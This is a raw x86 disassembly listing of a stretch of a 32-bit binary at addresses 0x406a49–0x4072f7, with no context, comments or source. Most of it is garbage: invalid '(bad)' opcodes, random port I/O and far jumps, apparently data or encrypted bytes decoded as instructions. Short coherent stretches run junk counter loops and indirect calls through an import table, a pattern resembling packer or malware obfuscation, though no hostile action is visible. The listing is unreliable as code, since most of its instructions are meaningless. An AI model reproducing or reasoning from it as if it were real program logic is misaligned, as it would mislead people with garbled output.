  406a49:	jo     0x406a17
  406a4b:	mov    dl,0x95
  406a4d:	not    BYTE PTR [ebp+0x4e]
  406a50:	fdivr  DWORD PTR [esi+0xa2281d3]
  406a56:	jno    0x406a80
  406a58:	daa    
  406a59:	int3   
  406a5a:	or     BYTE PTR [ebx-0x791c29f],ch
  406a60:	push   eax
  406a61:	sti    
  406a62:	dec    edi
  406a63:	fwait
  406a64:	(bad)  
  406a65:	in     eax,0xc6
  406a67:	cmc    
  406a68:	int    0x4e
  406a6a:	push   esi
  406a6b:	sbb    BYTE PTR [esi],dh
  406a6d:	sbb    ah,dl
  406a6f:	fisttp QWORD PTR [edi-0x70]
  406a72:	mov    ebx,DWORD PTR [edx+0x78408b1f]
  406a78:	mov    DWORD PTR [ebp+0xc],eax
  406a7b:	mov    eax,DWORD PTR [ebp-0x4]
  406a7e:	mov    esi,DWORD PTR [ebp-0x8]
  406a81:	xor    eax,edx
  406a83:	xor    esi,edx
  406a85:	add    eax,ecx
  406a87:	add    esi,ecx
  406a89:	imul   eax,esi
  406a8c:	jmp    0x406c05
  406a91:	xorps  xmm5,XMMWORD PTR [edi]
  406a94:	lds    esp,FWORD PTR [edi+0x5d]
  406a97:	in     eax,0x6d
  406a99:	bound  esi,QWORD PTR [esi]
  406a9b:	rcr    DWORD PTR [ebx+0x55],0x3f
  406a9f:	cld    
  406aa0:	out    dx,eax
  406aa1:	add    ebp,DWORD PTR ds:0x7fd87c7c
  406aa7:	jl     0x406b25
  406aa9:	stos   BYTE PTR es:[edi],al
  406aaa:	push   esi
  406aab:	int    0x8b
  406aad:	outs   dx,DWORD PTR ds:[esi]
  406aae:	repz into 
  406ab0:	push   ecx
  406ab1:	imul   edx,DWORD PTR [ebx-0x79],0x65c1f2db
  406ab8:	jge    0x406aca
  406aba:	push   ebx
  406abb:	je     0x406a46
  406abd:	dec    edi
  406abe:	mov    edx,0xc68dc696
  406ac3:	pop    edi
  406ac4:	xchg   edi,eax
  406ac5:	mov    BYTE PTR [edi],bh
  406ac7:	adc    DWORD PTR [ebx+0x3f],0x5a
  406acb:	add    bl,BYTE PTR [esp+eax*2-0x2954cefa]
  406ad2:	cmp    eax,0xa928f5fc
  406ad7:	push   ss
  406ad8:	loope  0x406ac6
  406ada:	cli    
  406adb:	inc    ebp
  406adc:	sub    ebp,ebx
  406ade:	add    bl,dl
  406ae0:	xchg   bl,ah
  406ae2:	inc    edi
  406ae3:	lahf   
  406ae4:	es sahf 
  406ae6:	fidiv  DWORD PTR [edx*2+0x24e6230c]
  406aed:	xor    bh,bl
  406aef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406af0:	outs   dx,BYTE PTR ds:[esi]
  406af1:	nop
  406af2:	dec    eax
  406af3:	xchg   ecx,eax
  406af4:	pop    ebx
  406af5:	iret   
  406af6:	(bad)
  406af9:	pop    ebp
  406afa:	loop   0x406b67
  406afc:	je     0x406b33
  406afe:	jl     0x406ab7
  406b00:	int3   
  406b01:	add    BYTE PTR [edi+0x49],ah
  406b04:	or     BYTE PTR [ebx+eax*1-0x965fb83],0xb3
  406b0c:	xor    BYTE PTR [edi-0x4ed5a804],bh
  406b12:	xor    al,0xdf
  406b14:	out    0xa3,eax
  406b16:	mov    dl,0x46
  406b18:	out    dx,al
  406b19:	and    cl,bl
  406b1b:	ret    
  406b1c:	ret    
  406b1d:	cdq    
  406b1e:	push   edi
  406b1f:	loopne 0x406b13
  406b21:	push   ebx
  406b22:	xor    dh,cl
  406b24:	sub    edi,DWORD PTR [ecx]
  406b26:	bound  esp,QWORD PTR [ebx-0x4c]
  406b29:	pop    eax
  406b2a:	dec    eax
  406b2b:	shl    DWORD PTR [ebp-0x43],0xe9
  406b2f:	enter  0x66c0,0x52
  406b33:	imul   eax,DWORD PTR [edx],0x56435022
  406b39:	dec    ecx
  406b3a:	add    edx,DWORD PTR [ebx+0x28]
  406b3d:	xchg   esi,eax
  406b3e:	dec    eax
  406b3f:	shl    cl,0xf8
  406b42:	xchg   edx,eax
  406b43:	jl     0x406ae4
  406b45:	dec    ebx
  406b46:	test   eax,0xc25d0532
  406b4b:	outs   dx,BYTE PTR ds:[esi]
  406b4c:	mov    esi,0x744eb4f
  406b51:	push   0xffffffc1
  406b53:	ins    DWORD PTR es:[edi],dx
  406b54:	xor    eax,0x6e36951b
  406b59:	mov    WORD PTR [ecx-0x29],gs
  406b5c:	je     0x406bac
  406b5e:	mov    dl,0x43
  406b60:	fldenv [ecx+ebp*4+0xc89326a]
  406b67:	mov    ebx,0x288e2e0e
  406b6c:	dec    ecx
  406b6d:	cmp    BYTE PTR [ebx-0x74],dl
  406b70:	pop    ebx
  406b71:	xchg   edi,eax
  406b72:	sub    eax,0xe549e757
  406b77:	push   0xffffffad
  406b79:	dec    edx
  406b7a:	mov    ds,WORD PTR [ebp+eiz*8-0x370282c0]
  406b81:	inc    eax
  406b82:	push   ecx
  406b83:	mov    dl,0x45
  406b85:	mov    BYTE PTR [eax-0x7ce9c10d],dh
  406b8b:	cmp    bh,dl
  406b8d:	sbb    ebx,ecx
  406b8f:	into   
  406b90:	xchg   ebp,eax
  406b91:	pop    es
  406b92:	ror    DWORD PTR [edx+ebx*8],cl
  406b95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b96:	outs   dx,BYTE PTR ds:[esi]
  406b97:	mov    ds:0x2c35896e,eax
  406b9c:	loop   0x406b47
  406b9e:	out    dx,eax
  406b9f:	pop    ds
  406ba0:	inc    esi
  406ba1:	jge    0x406bc2
  406ba3:	jns    0x406b2d
  406ba5:	ja     0x406b5d
  406ba7:	sub    cl,al
  406ba9:	daa    
  406baa:	inc    ebx
  406bab:	cmp    al,al
  406bad:	adc    eax,0xd6bf84cd
  406bb2:	ret    0xf6e7
  406bb5:	inc    ebx
  406bb6:	pop    esp
  406bb7:	or     DWORD PTR [edx+0x20f985c6],eax
  406bbd:	fidiv  WORD PTR [eax+0x2dd9bcdf]
  406bc3:	mov    dh,0xf1
  406bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bc6:	out    dx,al
  406bc7:	push   esp
  406bc8:	fsubr  DWORD PTR [esi-0x256154d4]
  406bce:	inc    edx
  406bcf:	add    DWORD PTR [ebp+0x79],edi
  406bd2:	mov    ecx,0x9a5d4957
  406bd7:	pop    ds
  406bd8:	call   0xab543220
  406bdd:	cmp    eax,0x62823b41
  406be2:	or     bh,BYTE PTR [ebp+0x17827c0a]
  406be8:	ficomp WORD PTR [esi]
  406bea:	test   al,0xa3
  406bec:	repnz and edx,eax
  406bef:	dec    ebx
  406bf0:	loop   0x406b73
  406bf2:	ss ret 0x6cbb
  406bf6:	mov    bh,0x37
  406bf8:	fstp   QWORD PTR [ebp-0x19]
  406bfb:	cs pop esp
  406bfd:	mov    eax,0x117781a5
  406c02:	outs   dx,BYTE PTR gs:[esi]
  406c04:	nop
  406c05:	mov    esi,DWORD PTR [ebp+0xc]
  406c08:	cmp    esi,eax
  406c0a:	mov    eax,DWORD PTR [ebp-0x4]
  406c0d:	je     0x40675d
  406c13:	xor    eax,edx
  406c15:	add    eax,ecx
  406c17:	mov    ecx,DWORD PTR [ebp+0xc]
  406c1a:	jmp    0x406d93
  406c1f:	stos   BYTE PTR es:[edi],al
  406c20:	adc    DWORD PTR [esp+ebp*2],ebp
  406c23:	mov    ebx,0xc2fd6a61
  406c28:	mov    al,ds:0xa9c4d58d
  406c2d:	jno    0x406bc1
  406c2f:	out    dx,eax
  406c30:	sub    al,0x7c
  406c32:	jl     0x406c0c
  406c34:	jg     0x406cb2
  406c36:	jl     0x406bc6
  406c38:	dec    ebx
  406c39:	das    
  406c3a:	test   DWORD PTR [ebx],edi
  406c3c:	int3   
  406c3d:	in     al,0xd0
  406c3f:	jle    0x406bc8
  406c41:	pop    ds
  406c42:	mov    ds:0xbd4650e9,al
  406c47:	add    dh,BYTE PTR [ebp-0x585e82d3]
  406c4d:	sub    bl,BYTE PTR [edi-0x7d]
  406c50:	and    BYTE PTR [esi-0x709f49f0],cl
  406c56:	jbe    0x406ca7
  406c58:	adc    eax,0x17752fee
  406c5d:	shr    dl,1
  406c5f:	cmc    
  406c60:	fstp   DWORD PTR [ecx+0x61]
  406c63:	mov    edi,0xbbc19242
  406c68:	(bad)  [esi-0x5]
  406c6b:	dec    eax
  406c6c:	and    DWORD PTR [edx+0x22],ebx
  406c6f:	ins    BYTE PTR es:[edi],dx
  406c70:	dec    edi
  406c71:	adc    DWORD PTR ds:0xbd530979,eax
  406c77:	mov    bl,0x6f
  406c79:	fldenv [ebx]
  406c7b:	jecxz  0x406c73
  406c7d:	or     BYTE PTR [ebx],dh
  406c7f:	push   ebp
  406c80:	pop    ss
  406c81:	pop    ebx
  406c82:	jb     0x406c46
  406c84:	shl    al,0xcf
  406c87:	add    eax,0x83a5ec1c
  406c8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c8d:	arpl   WORD PTR [esi+0x20cd2852],ax
  406c93:	fnstsw WORD PTR [esi]
  406c95:	xchg   esp,eax
  406c96:	in     eax,0x61
  406c98:	pop    esp
  406c99:	push   ebp
  406c9a:	sbb    edx,DWORD PTR [edi+edi*4-0x56]
  406c9e:	and    ch,bl
  406ca0:	mov    ebx,0xe064a3a4
  406ca5:	and    esi,edi
  406ca7:	cs out 0xe9,eax
  406caa:	cmc    
  406cab:	mov    esp,DWORD PTR [edi+0x69]
  406cae:	ret    0x4386
  406cb1:	jnp    0x406c7f
  406cb3:	xor    BYTE PTR [ebp+0x2a79018],bl
  406cb9:	pop    es
  406cba:	out    0x41,al
  406cbc:	out    dx,eax
  406cbd:	mov    eax,cs
  406cbf:	inc    edx
  406cc0:	out    0x62,al
  406cc2:	fiadd  WORD PTR [ecx+0x48e0fcad]
  406cc8:	fcomp  DWORD PTR [eax-0x20]
  406ccb:	xchg   ecx,eax
  406ccc:	in     al,dx
  406ccd:	adc    esi,DWORD PTR [esi+0x55]
  406cd0:	xchg   BYTE PTR [edx+0x443c23eb],dl
  406cd6:	jp     0x406cc6
  406cd8:	mov    al,ds:0x9cfa36be
  406cdd:	sahf   
  406cde:	jle    0x406cae
  406ce0:	pop    ss
  406ce1:	xchg   esi,eax
  406ce2:	push   ebx
  406ce3:	sub    BYTE PTR ds:0xde1d9736,ah
  406ce9:	cmp    edi,eax
  406ceb:	jmp    0x6633620d
  406cf0:	scas   al,BYTE PTR es:[edi]
  406cf1:	loopne 0x406d4c
  406cf3:	imul   ebp,DWORD PTR [ebx],0x537f79a1
  406cf9:	sar    DWORD PTR [eax+0x72],1
  406cfc:	mov    bl,BYTE PTR [eax+edi*1+0x50]
  406d00:	add    DWORD PTR [eax+0x35],eax
  406d03:	lea    ebp,[ebp-0x51]
  406d06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d07:	adc    bh,BYTE PTR [ebx+0x6f1689be]
  406d0d:	cmp    esi,esp
  406d0f:	call   0x3b717b4b
  406d14:	xor    al,0x75
  406d16:	inc    eax
  406d17:	push   edi
  406d18:	gs jbe 0x406d31
  406d1b:	in     al,dx
  406d1c:	and    BYTE PTR [esi+ebp*4-0x1a],0x48
  406d21:	call   0x997231d2
  406d26:	and    ch,BYTE PTR [bp+di]
  406d29:	xor    esp,ebx
  406d2b:	fdivrp st(6),st
  406d2d:	mov    bl,dl
  406d2f:	add    ecx,0x32f614e6
  406d35:	sub    ebp,esp
  406d37:	jl     0x406cf5
  406d39:	jnp    0x406d51
  406d3b:	adc    dh,BYTE PTR [eax]
  406d3d:	jp     0x406d5c
  406d3f:	mov    edx,0x68a8a0ae
  406d44:	xchg   ecx,eax
  406d45:	or     dh,BYTE PTR [edx]
  406d47:	jb     0x406da8
  406d49:	cmp    ah,al
  406d4b:	pop    es
  406d4c:	(bad)  
  406d4e:	jnp    0x406d96
  406d50:	retf   
  406d51:	xchg   ecx,eax
  406d52:	out    0xfa,al
  406d54:	scas   al,BYTE PTR es:[edi]
  406d55:	cdq    
  406d56:	adc    DWORD PTR [edx-0x78],eax
  406d59:	mov    bl,0x6d
  406d5b:	stos   BYTE PTR es:[edi],al
  406d5c:	cs retf 0x1f2b
  406d60:	pop    edi
  406d61:	iret   
  406d62:	adc    eax,0xdb27024a
  406d67:	hlt    
  406d68:	xor    edi,DWORD PTR [eax]
  406d6a:	add    al,0x8e
  406d6c:	xor    BYTE PTR [ecx-0x6b90531d],bl
  406d72:	cmp    DWORD PTR [ecx-0x6f54df2a],edx
  406d78:	mov    esp,eax
  406d7a:	mov    ch,0xd9
  406d7c:	dec    esi
  406d7e:	cs daa 
  406d80:	clc    
  406d81:	fldcw  WORD PTR [edi+0x7267fe87]
  406d87:	nop
  406d88:	add    eax,0xc1f57e93
  406d8d:	lds    ecx,FWORD PTR [eax+0x7c9b77db]
  406d93:	imul   eax,ecx
  406d96:	jmp    0x406f0f
  406d9b:	adc    ch,BYTE PTR [eax]
  406d9d:	mov    bl,0x55
  406d9f:	dec    ebp
  406da0:	ins    DWORD PTR es:[edi],dx
  406da1:	adc    ch,BYTE PTR [ebx-0x44]
  406da4:	sahf   
  406da5:	stos   BYTE PTR es:[edi],al
  406da6:	jmp    0x78056336
  406dab:	dec    ebx
  406dac:	das    
  406dad:	jl     0x406e2b
  406daf:	fdivr  DWORD PTR [edi+0x7c]
  406db2:	jl     0x406ddd
  406db4:	ret    0xff9b
  406db7:	aam    0xcd
  406db9:	cwde   
  406dba:	retf   
  406dbb:	jb     0x406d5b
  406dbd:	dec    esp
  406dbe:	sbb    cl,ch
  406dc0:	ret    
  406dc1:	dec    eax
  406dc2:	push   edx
  406dc3:	ins    DWORD PTR es:[edi],dx
  406dc4:	xchg   edx,eax
  406dc5:	push   es
  406dc6:	ins    DWORD PTR es:[edi],dx
  406dc7:	std    
  406dc8:	icebp  
  406dc9:	adc    ebx,edx
  406dcb:	push   ebp
  406dcc:	lahf   
  406dcd:	or     ah,dh
  406dcf:	xor    cl,BYTE PTR fs:[ebx+esi*4+0x35]
  406dd4:	(bad)  
  406dd6:	nop
  406dd7:	mov    esp,0x568b16d8
  406ddc:	mov    ds:0xbf13ec33,eax
  406de1:	mov    ah,0xbc
  406de3:	ret    0xade4
  406de6:	fnstcw WORD PTR [ecx+ecx*8]
  406de9:	xlat   BYTE PTR ds:[ebx]
  406dea:	push   0xd522a7d
  406def:	pop    ebx
  406df0:	xlat   BYTE PTR ds:[ebx]
  406df1:	rol    DWORD PTR [ecx+0x700a6424],cl
  406df7:	sub    bl,BYTE PTR [edx+0x74]
  406dfa:	xchg   edi,eax
  406dfb:	sti    
  406dfc:	outs   dx,BYTE PTR ds:[esi]
  406dfd:	inc    ebx
  406dfe:	and    esp,esi
  406e00:	pop    edx
  406e01:	fiadd  WORD PTR [esi]
  406e03:	sub    cl,ah
  406e05:	jbe    0x406de3
  406e07:	mul    ebp
  406e09:	cmp    BYTE PTR [edi],dh
  406e0b:	nop
  406e0c:	jmp    0xd0fd:0x28e6744b
  406e13:	cmp    ch,al
  406e15:	ins    DWORD PTR es:[edi],dx
  406e16:	push   ecx
  406e17:	and    al,0x96
  406e19:	jg     0x406e0b
  406e1b:	sahf   
  406e1c:	fdivr  QWORD PTR [edx+edx*8-0x3e]
  406e20:	mov    al,ds:0x5031f610
  406e25:	add    esi,DWORD PTR ds:[eax]
  406e28:	repnz push esp
  406e2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e2b:	xor    cl,dh
  406e2d:	dec    edx
  406e2e:	and    al,0x84
  406e31:	mov    WORD PTR [edi],es
  406e33:	outs   dx,DWORD PTR ds:[esi]
  406e34:	fsubr  DWORD PTR [ebx+ebp*1-0x7a14a630]
  406e3b:	jecxz  0x406e8f
  406e3d:	sub    BYTE PTR [esi+edi*2],cl
  406e40:	inc    ebp
  406e41:	mov    ecx,0xfaef442f
  406e46:	jg     0x406e5a
  406e48:	xor    eax,0xbf15d2d4
  406e4d:	or     DWORD PTR [edx+0x71],0x84165c10
  406e54:	dec    ebx
  406e55:	gs cld 
  406e57:	test   eax,0xdc1ebf95
  406e5c:	sbb    cl,BYTE PTR [ebp+0x6c96037a]
  406e62:	repz pop ds
  406e64:	mov    DWORD PTR [ebx+0x30],ebx
  406e67:	jecxz  0x406ed8
  406e69:	mov    ebx,ecx
  406e6b:	push   ebx
  406e6c:	je     0x406df9
  406e6e:	push   ss
  406e6f:	add    cl,BYTE PTR [ebp+0x9b5a29e]
  406e75:	hlt    
  406e76:	aas    
  406e77:	(bad)  
  406e78:	push   edx
  406e79:	inc    esi
  406e7a:	data16 fsubr QWORD PTR [edi+0x68]
  406e7e:	and    cl,BYTE PTR [ebx]
  406e80:	(bad)  
  406e81:	into   
  406e82:	stos   DWORD PTR es:[edi],eax
  406e83:	pusha  
  406e84:	jno    0x406eac
  406e86:	dec    ecx
  406e87:	push   ss
  406e88:	pop    edi
  406e89:	arpl   WORD PTR [eax+ebx*2],dx
  406e8c:	sub    dl,dl
  406e8e:	adc    ebx,eax
  406e90:	push   ds
  406e91:	sub    al,0x41
  406e93:	(bad)  
  406e94:	pop    ebp
  406e95:	jecxz  0x406eff
  406e97:	cmp    ebp,DWORD PTR [ebp-0x30253ec1]
  406e9d:	mov    dl,0x1d
  406e9f:	leave  
  406ea0:	(bad)  
  406ea1:	cmc    
  406ea2:	pushf  
  406ea3:	pop    ds
  406ea4:	arpl   bx,bp
  406ea6:	add    eax,edx
  406ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ea9:	dec    ebx
  406eaa:	loopne 0x406ec0
  406eac:	xchg   esi,eax
  406ead:	in     al,dx
  406eae:	scas   eax,DWORD PTR es:[edi]
  406eaf:	sti    
  406eb0:	retf   
  406eb1:	cld    
  406eb2:	fdivp  st(1),st
  406eb4:	or     al,0x52
  406eb6:	push   ebx
  406eb7:	outs   dx,BYTE PTR ds:[esi]
  406eb8:	or     edx,DWORD PTR [ebx+0x61cad36b]
  406ebe:	sub    al,0x5d
  406ec0:	in     al,dx
  406ec1:	mov    esi,0x562d7f7
  406ec6:	jecxz  0x406f02
  406ec8:	mov    edi,0xebe640b1
  406ecd:	rol    BYTE PTR [eax+0xb],cl
  406ed0:	aad    0x9f
  406ed2:	and    ebp,DWORD PTR [esi+0x77]
  406ed5:	and    DWORD PTR [ebp+0x38ef97fa],ebp
  406edb:	(bad)
  406ede:	mov    ebp,0x3d0a2cd
  406ee3:	pop    edi
  406ee4:	add    dl,BYTE PTR [ebx-0x48]
  406ee7:	cmp    al,0x9f
  406ee9:	jne    0x406e94
  406eeb:	pop    ebp
  406eec:	or     bl,ah
  406eee:	je     0x406f14
  406ef0:	sub    al,0xd6
  406ef2:	pop    esi
  406ef3:	jno    0x406efd
  406ef5:	push   ebp
  406ef6:	xor    eax,0x32aae282
  406efb:	mov    ah,0x5e
  406efd:	call   0x24dc:0xaff9d3bb
  406f04:	push   eax
  406f05:	nop
  406f06:	in     al,0x3d
  406f08:	lock (bad) 
  406f0a:	pop    ss
  406f0b:	sub    DWORD PTR [edx],esi
  406f0d:	ins    DWORD PTR es:[edi],dx
  406f0e:	and    al,0x3
  406f10:	inc    ebp
  406f11:	or     BYTE PTR [ecx+0x458b0c45],cl
  406f17:	or     al,0x5e
  406f19:	leave  
  406f1a:	ret    0x8
  406f1d:	push   ebp
  406f1e:	mov    ebp,esp
  406f20:	sub    esp,0x30
  406f23:	xor    eax,0x5695
  406f28:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  406f2f:	mov    DWORD PTR ds:0x4292ad,0x11
  406f39:	cmp    DWORD PTR ds:0x4292ad,0x0
  406f40:	je     0x406f7d
  406f46:	cmp    DWORD PTR ds:0x4292ad,0x1b
  406f4d:	jne    0x406f61
  406f53:	push   0x7d57
  406f58:	push   DWORD PTR [ebp-0xc]
  406f5b:	call   DWORD PTR ds:0x427ac7
  406f61:	mov    ecx,DWORD PTR ds:0x4292ad
  406f67:	dec    ecx
  406f68:	mov    DWORD PTR ds:0x4292ad,ecx
  406f6e:	jmp    0x406f39
  406f73:	xor    DWORD PTR ds:0x427594,0x427d17
  406f7d:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  406f84:	mov    ecx,DWORD PTR [ebp-0x4]
  406f87:	push   ebx
  406f88:	mov    eax,0x7510857
  406f8d:	adc    ebx,DWORD PTR ds:0x4292c5
  406f93:	xor    ecx,eax
  406f95:	and    DWORD PTR ds:0x4292c5,0x0
  406f9f:	jmp    0x406fb1
  406fa4:	mov    ebx,DWORD PTR ds:0x4292c5
  406faa:	inc    ebx
  406fab:	mov    DWORD PTR ds:0x4292c5,ebx
  406fb1:	cmp    DWORD PTR ds:0x4292c5,0x12
  406fb8:	jae    0x407003
  406fbe:	cmp    DWORD PTR ds:0x4292c5,0x4
  406fc5:	jne    0x406fe4
  406fcb:	push   DWORD PTR [ebp-0x18]
  406fce:	push   DWORD PTR [ebp-0x18]
  406fd1:	push   0x4bf1
  406fd6:	push   DWORD PTR [ebp-0x28]
  406fd9:	push   0x78bb
  406fde:	call   DWORD PTR ds:0x427acb
  406fe4:	cmp    DWORD PTR ds:0x4292c5,0x3
  406feb:	jne    0x406ffe
  406ff1:	mov    ebx,DWORD PTR ds:0x4292c5
  406ff7:	inc    ebx
  406ff8:	mov    DWORD PTR ds:0x4292c5,ebx
  406ffe:	jmp    0x406fa4
  407003:	mov    ebx,0x32729e
  407008:	add    DWORD PTR ds:0x427cfb,0x42c892
  407012:	add    ecx,ebx
  407014:	mov    DWORD PTR [ebp-0x1c],ecx
  407017:	neg    DWORD PTR ds:0x427d0f
  40701d:	mov    ecx,DWORD PTR [ebp+0x14]
  407020:	sub    DWORD PTR ds:0x427cf7,0x56dd
  40702a:	push   esi
  40702b:	push   edi
  40702c:	add    DWORD PTR ds:0x427d0f,0x42c89a
  407036:	test   ecx,ecx
  407038:	mov    DWORD PTR ds:0x4292c5,0x64aa
  407042:	je     0x407316
  407048:	and    DWORD PTR ds:0x42c882,0x0
  407052:	mov    esi,DWORD PTR ds:0x42c882
  407058:	inc    esi
  407059:	mov    DWORD PTR ds:0x42c882,esi
  40705f:	cmp    DWORD PTR ds:0x42c882,0x6
  407066:	jne    0x40707e
  40706c:	push   DWORD PTR [ebp-0x24]
  40706f:	push   DWORD PTR [ebp-0x18]
  407072:	push   DWORD PTR [ebp-0x14]
  407075:	push   DWORD PTR [ebp-0x28]
  407078:	call   DWORD PTR ds:0x427c6f
  40707e:	cmp    DWORD PTR ds:0x42c882,0x5
  407085:	jne    0x40709a
  40708b:	xor    esi,esi
  40708d:	or     esi,DWORD PTR ds:0x42c882
  407093:	inc    esi
  407094:	mov    DWORD PTR ds:0x42c882,esi
  40709a:	cmp    DWORD PTR ds:0x42c882,0x14
  4070a1:	jb     0x407052
  4070a7:	mov    ecx,DWORD PTR [ebp+0x14]
  4070aa:	mov    DWORD PTR ds:0x4292b1,0x1a
  4070b4:	cmp    DWORD PTR ds:0x4292b1,0x0
  4070bb:	je     0x407188
  4070c1:	cmp    DWORD PTR ds:0x4292b1,0xc
  4070c8:	jne    0x4070de
  4070ce:	push   0x42783c
  4070d3:	push   0x4275b4
  4070d8:	call   DWORD PTR ds:0x4279f3
  4070de:	cmp    DWORD PTR ds:0x4292b1,0xd
  4070e5:	jne    0x4070fa
  4070eb:	xor    edi,edi
  4070ed:	xor    edi,DWORD PTR ds:0x4292b1
  4070f3:	dec    edi
  4070f4:	mov    DWORD PTR ds:0x4292b1,edi
  4070fa:	xor    edi,edi
  4070fc:	or     edi,DWORD PTR ds:0x4292b1
  407102:	dec    edi
  407103:	mov    DWORD PTR ds:0x4292b1,edi
  407109:	jmp    0x4070b4
  40710e:	and    DWORD PTR ds:0x4292b5,0x0
  407118:	jmp    0x40712a
  40711d:	mov    edi,DWORD PTR ds:0x4292b5
  407123:	inc    edi
  407124:	mov    DWORD PTR ds:0x4292b5,edi
  40712a:	cmp    DWORD PTR ds:0x4292b5,0x16
  407131:	jae    0x407188
  407137:	cmp    DWORD PTR ds:0x4292b5,0x4
  40713e:	jne    0x407169
  407144:	push   DWORD PTR [ebp-0x28]
  407147:	push   0x1a81
  40714c:	push   0x427d07
  407151:	push   0x8e69
  407156:	push   0x489c
  40715b:	push   0x5b7d
  407160:	push   DWORD PTR [ebp-0x10]
  407163:	call   DWORD PTR ds:0x427c73
  407169:	cmp    DWORD PTR ds:0x4292b5,0x3
  407170:	jne    0x407183
  407176:	mov    edi,DWORD PTR ds:0x4292b5
  40717c:	inc    edi
  40717d:	mov    DWORD PTR ds:0x4292b5,edi
  407183:	jmp    0x40711d
  407188:	mov    ecx,DWORD PTR [ecx]
  40718a:	jmp    0x407313
  40718f:	jne    0x40718d
  407191:	mov    cl,0x3f
  407193:	mov    ch,0x31
  407195:	cmc    
  407196:	mov    dl,0xc1
  407198:	pop    edx
  407199:	sub    DWORD PTR [esi-0x2347d2e0],esp
  40719f:	pop    ss
  4071a0:	and    DWORD PTR [esp+edi*2-0x18],edi
  4071a4:	jg     0x407222
  4071a6:	jl     0x4071d6
  4071a8:	mov    al,0x94
  4071aa:	mov    edi,0x1d73df6e
  4071af:	xor    eax,0x2bce4a9b
  4071b4:	sbb    al,0xa1
  4071b6:	mov    cl,0x39
  4071b8:	pop    ebp
  4071b9:	jnp    0x40720a
  4071bb:	cdq    
  4071bc:	xchg   BYTE PTR [ecx],ch
  4071be:	mov    edx,ebx
  4071c0:	nop
  4071c1:	stos   BYTE PTR es:[edi],al
  4071c2:	push   ecx
  4071c3:	push   edx
  4071c4:	sbb    al,0x86
  4071c6:	and    al,0x18
  4071c8:	fcmovne st,st(1)
  4071ca:	(bad)  
  4071cb:	mov    ecx,0x57d13820
  4071d0:	loop   0x4071ee
  4071d2:	sbb    eax,DWORD PTR [eax+0x1e8c8e9a]
  4071d8:	xor    dl,BYTE PTR [edi+0x3f]
  4071db:	stos   BYTE PTR es:[edi],al
  4071dc:	and    DWORD PTR [ecx-0x12],esp
  4071df:	jns    0x4071b2
  4071e1:	jge    0x407224
  4071e3:	xchg   esp,eax
  4071e4:	pop    edx
  4071e5:	mov    dh,BYTE PTR [eax+0x76]
  4071e8:	xchg   esp,eax
  4071e9:	ret    
  4071ea:	jo     0x4071b6
  4071ec:	mov    ebx,0xe91dd67d
  4071f1:	push   es
  4071f2:	imul   ecx,DWORD PTR [esi+eax*4-0x516fcb89],0xc02af8c7
  4071fd:	push   ds
  4071fe:	jne    0x4071d1
  407200:	repz das 
  407202:	mov    ecx,edx
  407204:	pop    esi
  407205:	arpl   WORD PTR [eax+ecx*4-0x7c2ecd42],bp
  40720c:	pop    es
  40720d:	dec    esi
  40720e:	fbld   TBYTE PTR [ecx+0x364fa1a]
  407214:	mul    BYTE PTR [eax+0x54be32ab]
  40721a:	and    al,0xa1
  40721c:	cwde   
  40721d:	jae    0x4071ac
  40721f:	lahf   
  407220:	sbb    edx,DWORD PTR [esi-0x6e]
  407223:	pop    ebp
  407224:	js     0x407280
  407226:	addr16 mov bl,0xc5
  407229:	repz ror DWORD PTR [edx-0x26],cl
  40722d:	bound  ecx,QWORD PTR [ecx+0x50]
  407230:	outs   dx,BYTE PTR ds:[esi]
  407231:	les    ebx,FWORD PTR [eax]
  407233:	pop    edx
  407234:	sbb    eax,0x1a8ff1c6
  407239:	pop    ss
  40723a:	aad    0xae
  40723c:	outs   dx,BYTE PTR ds:[esi]
  40723d:	out    0x15,eax
  40723f:	adc    ebx,esp
  407241:	in     eax,dx
  407242:	jno    0x4072b0
  407244:	jnp    0x407206
  407246:	jb     0x407244
  407248:	mov    esp,0x70b9ff26
  40724d:	ret    
  40724e:	in     eax,dx
  40724f:	icebp  
  407250:	pop    eax
  407251:	mov    ecx,0x967dba47
  407256:	addr16 call 0xe4949f4b
  40725c:	mov    dl,0x80
  40725e:	jnp    0x4072c0
  407260:	ins    BYTE PTR es:[edi],dx
  407261:	push   0xa91833b
  407266:	jle    0x407276
  407268:	js     0x4071ed
  40726a:	lock rol BYTE PTR [bx+di],1
  40726e:	pusha  
  40726f:	imul   esi,DWORD PTR [edx+edi*8+0x5c95852f],0x79
  407277:	sub    eax,0x5d9f836e
  40727c:	jg     0x407226
  40727e:	push   esi
  40727f:	push   0x74
  407281:	fidiv  WORD PTR [eax+0xab62be]
  407287:	ss or  eax,0x97af91fc
  40728d:	enter  0x9765,0xa2
  407291:	dec    edx
  407292:	shl    eax,1
  407294:	jns    0x407241
  407296:	addr16 push 0x79
  407299:	and    bh,BYTE PTR ds:0x45e5f1ff
  40729f:	xor    DWORD PTR [esi],eax
  4072a1:	retf   
  4072a2:	jb     0x4072e9
  4072a4:	fyl2xp1 
  4072a6:	retf   
  4072a7:	xchg   edx,eax
  4072a8:	cdq    
  4072a9:	mov    ebp,0x89602230
  4072ae:	fs push edi
  4072b0:	xchg   esi,eax
  4072b1:	loope  0x407289
  4072b3:	imul   edx,esi,0xffffffb3
  4072b6:	adc    eax,DWORD PTR [ebx+0x3d]
  4072b9:	sbb    DWORD PTR [ebx-0x63902c65],0x70924b22
  4072c3:	and    al,0xde
  4072c5:	rol    cl,0x2f
  4072c8:	clc    
  4072c9:	nop
  4072ca:	cmc    
  4072cb:	test   eax,0x1803d01a
  4072d0:	ja     0x407350
  4072d2:	addr16 pusha 
  4072d4:	idiv   BYTE PTR [ecx+eax*8+0x3f29345c]
  4072db:	ss or  al,0xce
  4072de:	shr    cl,0x7c
  4072e1:	push   ss
  4072e2:	cmp    BYTE PTR [esi-0x18],al
  4072e5:	add    dl,cl
  4072e7:	add    BYTE PTR [edx+0x69d1f661],dh
  4072ed:	mov    ebp,0x9bdc3eca
  4072f2:	mov    al,ds:0xfc2979ca
  4072f7:	jecxz  0x407280
